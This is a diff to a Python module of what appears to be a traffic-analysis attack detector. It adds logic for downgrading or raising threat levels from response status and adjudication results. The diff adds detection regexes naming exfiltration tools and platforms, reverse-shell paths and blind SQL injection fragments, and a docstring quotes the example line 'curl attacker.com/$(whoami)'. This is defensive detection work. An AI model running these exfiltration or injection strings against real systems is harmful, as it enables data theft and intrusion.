@@ -1,9 +1,63 @@
 # detection_result.py - 检测结果数据结构
 
+import re
 from dataclasses import dataclass, field
 from typing import List, Dict, Optional, Any
 from enum import Enum
 import uuid
+
+
+# 带外(OOB)特征：攻击效果不经由本次 HTTP 响应返回，所以响应是不是 404
+# 与攻击成败无关。命中这些的条目即使返回 404 也不降威胁等级。
+#
+# 宁可多豁免几条也不能漏 —— 豁免只会让噪声多一点，漏掉的是真实攻击。
+_OOB_MARKERS = re.compile(
+    r"(?:"
+    r"dnslog\.|ceye\.io|burpcollaborator|interact\.sh|\.oast\.|requestbin"
+    r"|pipedream\.net|dnsbin|xip\.io|nip\.io"          # 外带平台
+    r"|\bnslookup\b|\bdig\s|\bhost\s+-t\b"             # DNS 查询
+    r"|\bcurl\s|\bwget\s|certutil\s+-urlcache"         # HTTP 外连
+    r"|Invoke-WebRequest|\biwr\b|bitsadmin\s+/transfer"
+    r"|/dev/tcp/"                                       # bash 反弹
+    r")",
+    re.IGNORECASE,
+)
+
+
+def _has_oob_marker(text: str) -> bool:
+    if not text:
+        return False
+    return _OOB_MARKERS.search(text) is not None
+
+
+# 盲注特征：攻击**成功时响应也看不出任何异常**，所以"响应正常"不能
+# 用来否定它。
+#
+# 这类攻击的判据在响应之外：时间盲注看的是响应延迟，布尔盲注看的是
+# 同一参数不同取值下响应长度的差异 —— 两者都不是单条检测能回答的。
+# 在拿到那种判据之前，这里只能豁免，不能降档。
+#
+# 与 _OOB_MARKERS 分开是因为两者的理由不同：带外是"效果走了别的信道"，
+# 盲注是"效果本来就不产生可见回显"。合并成一个表会让注释说不清楚。
+_BLIND_MARKERS = re.compile(
+    r"(?:"
+    r"\bsleep\s*\(|\bbenchmark\s*\(|\bpg_sleep\s*\("      # MySQL / PostgreSQL
+    r"|waitfor\s+delay|\bdbms_lock\.sleep|\bdbms_pipe\."  # MSSQL / Oracle
+    r"|\bif\s*\(\s*\d+\s*=\s*\d+\s*,\s*sleep"             # if(1=1,sleep(5),0)
+    r"|\bextractvalue\s*\(|\bupdatexml\s*\("              # 报错注入（回显在错误里）
+    r")",
+    re.IGNORECASE,
+)
+
+
+def _has_blind_marker(text: str) -> bool:
+    if not text:
+        return False
+    return _BLIND_MARKERS.search(text) is not None
+
+
+# 等级由低到高。抬档/降档比较用，与 ThreatLevel._ORDER 保持一致。
+_THREAT_ORDER = ("info", "low", "medium", "high", "critical")
 
 
 class ThreatLevel(Enum):
@@ -13,6 +67,21 @@ class ThreatLevel(Enum):
     MEDIUM = "medium"
     HIGH = "high"
     CRITICAL = "critical"
+
+    # 由低到高。降档用，顺序和 severity_policy._PRIORITY 一致
+    # （那边不能反过来 import 这里，会循环）
+    _ORDER = ("info", "low", "medium", "high", "critical")
+
+    def downgrade(self, steps: int = 1) -> "ThreatLevel":
+        """降 steps 档，到 INFO 为止。steps <= 0 时原样返回。"""
+        if steps <= 0:
+            return self
+        order = ThreatLevel._ORDER.value
+        try:
+            index = order.index(self.value)
+        except ValueError:
+            return self
+        return ThreatLevel(order[max(0, index - steps)])
 
     @property
     def display_name(self) -> str:
@@ -250,6 +319,299 @@ class DetectionResult:
         if not isinstance(verdict, dict):
             return []
         return [str(r) for r in (verdict.get("reasons") or []) if r]
+
+    # ---------------------------------------------------------- 有效威胁等级
+
+    # 明确的失败状态码。500 不在内 —— 注入把应用打崩同样返回 500，
+    # 那反而是"打中了"的迹象。口径与 success_adjudicator._FAILED_STATUS 一致。
+    _FAILED_STATUS = frozenset({"400", "401", "403", "404", "405", "406", "410", "501"})
+
+    # 降几档，按原始等级分档处理。
+    #
+    # 高危/严重降 1 档：这两档往往是 RCE、反序列化、上传这类**万一打成了
+    # 后果很重**的类型，404 只能压低它们的优先级，不能让它们掉出视线。
+    # 降到中危/高危仍在优先呈现区（severity_policy.PRIORITY_LEVELS），
+    # 不会被 filter_noise 收掉。
+    #
+    # 中危/低危降 2 档：这两档本来就是扫描器探测的主力（目录爆破、
+    # 常见路径试探），带上 404 基本可以断定是打空的，直接沉到信息级。
+    _FAILED_DOWNGRADE_STEPS = {
+        ThreatLevel.CRITICAL: 1,   # 严重 → 高危
+        ThreatLevel.HIGH: 1,       # 高危 → 中危
+        ThreatLevel.MEDIUM: 2,     # 中危 → 信息
+        ThreatLevel.LOW: 2,        # 低危 → 信息
+        ThreatLevel.INFO: 0,       # 已经在底了
+    }
+
+    # "研判跑过、响应也拿到了，但没有任何成功证据"的降档幅度。
+    #
+    # ── 为什么这一档比"明确失败"降得**更狠** ──
+    #
+    # 直觉上会觉得证据更弱就该降得更轻，但这两个理由回答的是**不同的问题**：
+    #
+    #   response_4xx          服务器拒绝了这次请求 → 攻击**没到达**目标逻辑。
+    #                         可能是 WAF 挡了、路径不存在、参数被过滤。
+    #                         目标本身**可能仍然脆弱**，只是这一发没打中。
+    #
+    #   no_success_evidence   请求被正常处理（200），响应也拿到了，三个研判
+    #                         维度一个都没命中 → 攻击**到达了**目标逻辑
+    #                         并且**没有产生任何效果**。
+    #
+    # 后者才是"这个攻击对这个目标无效"的强证据。所以降 2 档。
+    #
+    # 严重降到中危仍在 severity_policy.PRIORITY_LEVELS 里（严重/高危/中危），
+    # 不会被 filter_noise 收掉 —— 是"不再刺眼"，不是"看不见"。
+    #
+    # 实测依据（166MB 标定包，独立核对过 ground truth）：1031 条 critical 里
+    # 真正得手的只有 a.php 上那条菜刀链，而它已被链传播豁免；其余全是打同一个
+    # 登录页的 LFI/SQLi 字典，响应清一色 200 正常页面。降 1 档时它们变成
+    # 1029 条"高危"，照样占满屏幕。
+    _NO_EVIDENCE_DOWNGRADE_STEPS = {
+        ThreatLevel.CRITICAL: 2,   # 严重 → 中危（仍在优先呈现区）
+        ThreatLevel.HIGH: 2,       # 高危 → 低危
+        ThreatLevel.MEDIUM: 2,     # 中危 → 信息
+        ThreatLevel.LOW: 2,        # 低危 → 信息
+        ThreatLevel.INFO: 0,
+    }
+
+    # threat_downgrade_reason 返回这个前缀时，用上面那张较保守的表
+    _NO_EVIDENCE_REASON = "no_success_evidence"
+
+    # 研判确认得手时，界面等级的下限。
+    #
+    # 原来 effective_threat_level 只会**降**不会**升**，于是出现过这种事：
+    # 一条 `cmd=whoami` 打在 WebShell 上、服务器回了执行结果，规则给的权重
+    # 是 85（中危 —— 因为"发一条 whoami"这个**意图**本身确实不算重），
+    # 研判判定 confirmed，界面上还是中危。而同一个包里一堆打空的扫描
+    # payload 因为载荷花哨反而是高危。
+    #
+    # "确认打进来了"是这个工具能给出的最重要的结论，它必须能把条目顶上去，
+    # 不能只是"不往下压"。原始 threat_level / total_weight 一律不动。
+    _CONFIRMED_FLOOR = ThreatLevel.HIGH
+
+    @property
+    def effective_threat_level(self) -> "ThreatLevel":
+        """排序、着色、噪声收敛该用的等级。
+
+        为什么要这个派生值：`threat_level` 是在**检测阶段**定的，那时候
+        `AttackDetector.detect()` 的签名里根本没有响应参数，看不到服务器回了
+        什么。响应状态由 stream_worker 事后附加，研判引擎只据此把 outcome 置
+        成 FAILED，**不碰 weight**（那是 success_adjudicator 的铁律：研判只增
+        不减）。结果就是一条 `?id=1 union select...` 返回 404 的扫描器探测，
+        威胁等级列照样是红的高危。
+
+        所以这里不改原始判定，另算一个"结合了后果的等级"给界面用。原始
+        `threat_level` 和 `total_weight` 原样保留在数据里，导出两个值都带，
+        判错了能复核、能回退。
+
+        两个方向都要走：
+          确认得手 → 至少抬到 _CONFIRMED_FLOOR（见那里的说明）
+          没有得手迹象 / 明确失败 → 按 threat_downgrade_reason 降档
+
+        豁免见 `_downgrade_exemption` —— 404 不是可靠的失败证据。
+        """
+        if self._landed_by_self_or_chain():
+            floor = self._CONFIRMED_FLOOR
+            current = self.threat_level
+            if _THREAT_ORDER.index(current.value) < _THREAT_ORDER.index(floor.value):
+                return floor
+            return current
+        if not self.threat_downgrade_reason:
+            return self.threat_level
+        return self.threat_level.downgrade(self.threat_downgrade_steps)
+
+    def _landed_by_self_or_chain(self) -> bool:
+        """这条检测是否属于一次**已证实得手**的攻击。
+
+        两种都算，因为对"该不该顶到眼前"这个问题它们是等价的：
+
+          自己确认    这一条本身有客观后果证据
+          所属链确认  它是一次已证实得手的攻击链的组成部分
+
+        后者不可省。实测 DVWA 的链：
+            frame 68  POST /vulnerabilities/upload/   ← 上传 ma.php，confirmed
+            frame 93  GET  /hackable/uploads/ma.php   ← 访问它，自己看不出名堂
+        frame 93 是攻击真正生效的那一步，但它单独看只是"GET 了一个 php
+        文件，响应 200"，研判给 unknown。只认自己的结论，它就停在低危，
+        比上传那一条低两档 —— 而分析员最该点开的恰恰是它。
+        """
+        if self.success_outcome == "confirmed":
+            return True
+        raw = self.raw_result if isinstance(self.raw_result, dict) else {}
+        return str(raw.get("chain_outcome") or "") == "confirmed"
+
+    @property
+    def threat_upgrade_reason(self) -> str:
+        """因为"确认得手"而被抬档时的说明。空串 = 没抬。"""
+        if not self._landed_by_self_or_chain():
+            return ""
+        if self.effective_threat_level is self.threat_level:
+            return ""
+        if self.success_outcome == "confirmed":
+            return "confirmed_landed"
+        return "confirmed_chain"
+
+    @property
+    def threat_downgrade_steps(self) -> int:
+        """这条实际降了几档。0 = 没降。界面提示文案要用到。"""
+        reason = self.threat_downgrade_reason
+        if not reason:
+            return 0
+        table = (self._NO_EVIDENCE_DOWNGRADE_STEPS
+                 if reason == self._NO_EVIDENCE_REASON
+                 else self._FAILED_DOWNGRADE_STEPS)
+        return table.get(self.threat_level, 0)
+
+    @property
+    def threat_downgrade_reason(self) -> str:
+        """为什么降档。空串 = 没降，界面和报告据此决定要不要显示说明。
+
+        两档降档理由，强度不同：
+
+          response_<code>       服务器明确拒绝（404/403…）—— 正面的失败证据
+          no_success_evidence   研判跑完、响应也拿到了，但 A/B/C 三个维度
+                                一个都没命中 —— 证据的**缺席**
+
+        后者是这次新增的，理由见 _NO_EVIDENCE_DOWNGRADE_STEPS 的注释：
+        真实攻击里打空的 payload 绝大多数返回 200，只认失败状态码等于
+        整个机制对最常见的情形完全失效。
+
+        三条前提缺一不可，都是为了不把"不知道"当成"失败"：
+          1. 研判确实跑过（outcome 非空）—— 空串是"没研判"，不是"没得手"
+          2. 响应确实配上了（status 非空）—— 抓不到响应同样是"不知道"
+          3. 没有命中豁免（盲注/带外/反弹/主机证据/AST 污点）
+        """
+        raw = self.raw_result if isinstance(self.raw_result, dict) else {}
+        status = str(raw.get("response_status") or "").strip()
+        outcome = self.success_outcome
+
+        # 研判给出了正面证据，一切降档都免谈
+        if outcome in ("confirmed", "suspected"):
+            return ""
+
+        if self._downgrade_exemption():
+            return ""
+
+        # 服务器明确拒绝
+        if status in self._FAILED_STATUS:
+            return f"response_{status}"
+
+        # 研判跑过、响应也拿到了，却没有任何成功迹象。
+        # outcome 为空串时**不降** —— 那是压根没研判过（例如 AST 阶段
+        # 新产出的检测，见 stream_worker._fetch_http_responses 的说明），
+        # 把它当失败会凭空压低一整批从没被研判看过的条目。
+        if outcome == "unknown" and status:
+            return self._NO_EVIDENCE_REASON
+
+        return ""
+
+    @property
+    def threat_downgrade_note(self) -> str:
+        """降档说明，一句话，给界面提示和报告用。
+
+        存在的理由：`threat_downgrade_reason` 是**机器可读的标识**
+        （`response_404` / `no_success_evidence`），不是人话。界面和导出
+        原来都写死了 `reason.replace("response_", "")` 拿状态码 —— 那在
+        只有一种降档原因时能凑合，多一种就会显示成
+        「服务器返回 no_success_evidence」这种病句。
+
+        新增降档原因时**必须**在这里补一条对应文案，否则界面会把标识
+        原样吐给用户。
+        """
+        reason = self.threat_downgrade_reason
+        if not reason:
+            return ""
+        if reason == self._NO_EVIDENCE_REASON:
+            return "响应正常，研判未发现任何得手迹象"
+        if reason.startswith("response_"):
+            return f"服务器返回 {reason[len('response_'):]}、研判为未生效"
+        return reason
+
+    @property
+    def threat_downgrade_badge(self) -> str:
+        """降档原因的短标签（报告表格里跟在"原严重"后面那个）。"""
+        reason = self.threat_downgrade_reason
+        if not reason:
+            return ""
+        if reason == self._NO_EVIDENCE_REASON:
+            return "无得手迹象"
+        if reason.startswith("response_"):
+            return reason[len("response_"):]
+        return reason
+
+    def _downgrade_exemption(self) -> str:
+        """即使响应是 404 也不降档的情况，返回豁免原因（空串 = 不豁免）。
+
+        404 只说明"这个 URL 没返回内容"，不等于"攻击没成功"：
+
+          盲注    时间/布尔盲注本来就不看回显，页面 404 不影响注入执行
+          带外    curl attacker.com/$(whoami) 把数据带走了，响应是什么无所谓
+          WAF     部分 WAF 拦截后返回 404 而非 403，"被拦"≠"目标没有漏洞"
+
+        success_adjudicator.py 里维度 C 已经明确豁免过 404（注释原文：
+        "注入把页面打成 404、同时触发反弹 shell 是完全可能的"），这里沿用
+        同一套判据。
+        """
+        raw = self.raw_result if isinstance(self.raw_result, dict) else {}
+        verdict = raw.get("success_verdict")
+        verdict = verdict if isinstance(verdict, dict) else {}
+        dimensions = set(verdict.get("dimensions") or [])
+        evidence = verdict.get("evidence") or {}
+
+        # 维度 C：服务器掉头往外连了。这条不豁免会造成实打实的漏检。
+        if "C" in dimensions or (isinstance(evidence, dict)
+                                 and evidence.get("reverse_shell")):
+            return "reverse_shell"
+
+        # 维度 D：EDR 在主机侧看到了对应的进程/文件/连接
+        if "D" in dimensions:
+            return "host_evidence"
+
+        # 所属攻击链上有别的条目已被证实得手。
+        #
+        # 研判是逐条下结论的，攻击却是成链发生的。实测：一个 webshell
+        # (`POST /images/article/a.php`) 在抓包里被访问 19 次，逐条研判
+        # 只认出 1 条 confirmed —— 另外 18 次单独看都只是"POST 了个 php
+        # 文件，响应 200"，看不出名堂。但它们是同一条链上的同一次利用。
+        #
+        # 链的粒度是 (来源 IP, 目标 IP, 规范化路径)，见 core/attack_chain。
+        # 用路径而不是只用来源：一个攻击者扫 3954 个 URI、其中一个得手，
+        # 不能把另外 3953 个全部"救"回高危 —— 那是换一种误报。
+        if str(raw.get("chain_outcome") or "") in ("confirmed", "suspected"):
+            return "attack_chain"
+
+        # AST 确认污点流入危险函数 / 语义判定为 WebShell
+        if raw.get("semantic_validated"):
+            return "tainted_sink"
+        analysis = raw.get("ast_analysis")
+        if isinstance(analysis, dict):
+            for item in analysis.get("results") or []:
+                if isinstance(item, dict) and item.get("is_likely_webshell"):
+                    return "ast_webshell"
+
+        # 带外：攻击效果不经由本次 HTTP 响应返回
+        if _has_oob_marker(self._searchable_request_text(raw)):
+            return "out_of_band"
+
+        # 盲注：攻击成功时响应也看不出异常，"响应正常"不能否定它。
+        # 这条对新增的 no_success_evidence 降档尤其关键 —— 时间盲注
+        # 打成了同样是 200 + 正常页面，不豁免就会被当成打空的。
+        if _has_blind_marker(self._searchable_request_text(raw)):
+            return "blind_injection"
+
+        return ""
+
+    def _searchable_request_text(self, raw: Dict) -> str:
+        parts = [
+            str(self.uri or ""),
+            str(raw.get("raw_request_body_full") or raw.get("raw_request_body") or ""),
+        ]
+        decoded = raw.get("payloads")
+        if isinstance(decoded, dict):
+            inner = decoded.get("decoded")
+            if isinstance(inner, dict):
+                parts.append(str(inner.get("decoded") or ""))
+        return "\n".join(p for p in parts if p)
 
     def to_table_row(self) -> List[str]:
         # 特征摘要
